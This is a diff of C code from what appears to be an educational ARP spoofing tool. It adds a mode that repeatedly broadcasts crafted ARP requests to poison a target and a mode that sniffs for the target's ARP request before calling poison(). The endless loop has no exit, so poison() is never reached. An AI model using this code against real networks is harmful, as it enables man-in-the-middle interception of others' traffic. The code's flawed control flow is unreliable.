@@ -29,53 +29,85 @@ void	signal_handling()
 	sigaction(SIGINT, &sa, NULL);
 }
 
+void    choose_socket_type(t_data *data)
+{
+	if (BONUS == TRUE && (data->opt & REQUEST))
+	{
+		// Using DGRAM builds the ethernet header for me, no need to build from scratch
+		g_packet_socket = socket(AF_PACKET, SOCK_DGRAM, htons(ETH_P_ARP));
+		if (g_packet_socket <= -1)
+			error("socket() failed", errno, TRUE);
+	}
+	else
+	{
+		// Using RAW allow to receive raw packets
+		g_packet_socket = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
+		if (g_packet_socket <= -1)
+			error("socket() failed", errno, TRUE);
+	}
+}
+
 int main(int argc, char **argv)
 {
-	t_data  data = {0};
-    struct ether_arp arp = {0};
+	t_data              data = {0};
+	// we will use this to manipulate arp requests and replies
+	t_arp_packet    req = {0};
+	// we will use this buffer to receive packets
+	uint8_t         buffer[MAX_BUF];
+	// we will use this to broadcast to all MAC device
     const unsigned char ether_broadcast_addr[]= {0xff,0xff,0xff,0xff, 0xff,0xff};
-    struct sockaddr_ll addr = {0};
+    // this will contain the link layer address
+	struct sockaddr_ll addr = {0};
+	socklen_t   addr_len = sizeof(addr);
 
 	welcome();
 	signal_handling();
 	init_checks(argc, argv, &data);
-
-	g_packet_socket = socket(AF_PACKET, SOCK_DGRAM, htons(ETH_P_ARP));
-	if (g_packet_socket <= -1)
-		error("socket() failed", errno, TRUE);
-	if (BONUS == TRUE && argc == 6 && !ft_strcmp(argv[5], "--verbose"))
-		getHost(&data);
+	choose_socket_type(&data);
+	if (BONUS == TRUE && argc == 7 && !ft_strcmp(argv[6], "--verbose"))
+		getHost(&data); // Hostname resolution
 	else
-		interface(&data);
-
-    addr.sll_family = AF_PACKET;
-    addr.sll_halen = ETH_ALEN;
-    addr.sll_protocol = htons(ETH_P_ARP);
-    ft_memcpy(addr.sll_addr,ether_broadcast_addr,ETH_ALEN);
-    addr.sll_ifindex = data.interface_index;
-
+		interface(&data); // Get interface data
+	get_link_layer_addr(&data, ether_broadcast_addr, &addr);
+	build_arp_request(&data, &req);
     printf("Using interface: %s of index: %d\n", data.interface, addr.sll_ifindex);
-	printf("\nWaiting for ARP request...\n\n");
-
-    // make ARP header
-    arp.arp_hrd = htons(ARPHRD_ETHER);
-    arp.arp_pro = htons(ETH_P_IP);
-    arp.arp_hln = ETH_ALEN;
-    arp.arp_pln = sizeof(in_addr_t);
-    arp.arp_op = htons(ARPOP_REQUEST);
-    // make ARP data
-    ft_memcpy(&arp.arp_tpa,&data.target.sin_addr,sizeof(arp.arp_tpa));
-    ft_memcpy(&arp.arp_tha, &data.target_mac, sizeof(arp.arp_tha));
-    ft_memcpy(&arp.arp_spa, &data.source.sin_addr, sizeof(arp.arp_spa));
-    ft_memcpy(&arp.arp_sha, &data.source_mac, sizeof(arp.arp_sha));
-
-    while (1)
+	if (BONUS == TRUE && (data.opt & REQUEST))
+		printf("\nSending ARP request to poison target...\n\n");
+	else
+		printf("\nWaiting for ARP request...\n\n");
+	while (TRUE)
 	{
-        if (sendto(g_packet_socket, &arp, sizeof(arp), 0, (struct sockaddr *)&addr, sizeof(addr))==-1)
-        {
-            error("sendto() failed", errno, TRUE);
-        }
-		sleep(1);
+		if (BONUS == TRUE && (data.opt & REQUEST)) // check if we are on request attack
+		{
+			if (sendto(g_packet_socket, &req, sizeof(req), 0, (struct sockaddr *)&addr, sizeof(addr)) == -1)
+				error("sendto() failed", errno, TRUE);
+			sleep(1);
+		}
+		else // else it is a REPLY attack
+		{
+			ssize_t buf_len;
+			buf_len = recvfrom(g_packet_socket, buffer, 1001, 0, (struct sockaddr *)&addr, &addr_len);
+			if (buf_len == -1)
+				error("recvfrom() failed", errno, FALSE);
+			buffer[buf_len] = 0;
+			printf("Packet received, reading ethernet header...\n");
+			struct ethhdr *eth_hdr = (struct ethhdr *)buffer;
+			if (ntohs(eth_hdr->h_proto) == ETH_P_ARP)
+				printf("ARP packet incoming...\n");
+			else
+				continue ;
+			t_arp_packet *arp_request = (t_arp_packet *)(buffer + ETHER_HDR_LEN);
+			if (ntohs(arp_request->arp_opcode) == ARPOP_REQUEST
+				&& arp_request->arp_spa == data.target.sin_addr.s_addr
+				&& arp_request->arp_dpa == data.source.sin_addr.s_addr)
+				printf("ARP request received\nwho has %s, tell %s", inet_ntoa(data.source.sin_addr), inet_ntoa(data.target.sin_addr));
+			else
+				continue ;
+		}
 	}
+	poison(&data);
+	if (close(g_packet_socket) == -1)
+		error("Error: close() failed: ", errno, TRUE);
+	g_packet_socket = -1;
 	return (0);
 }
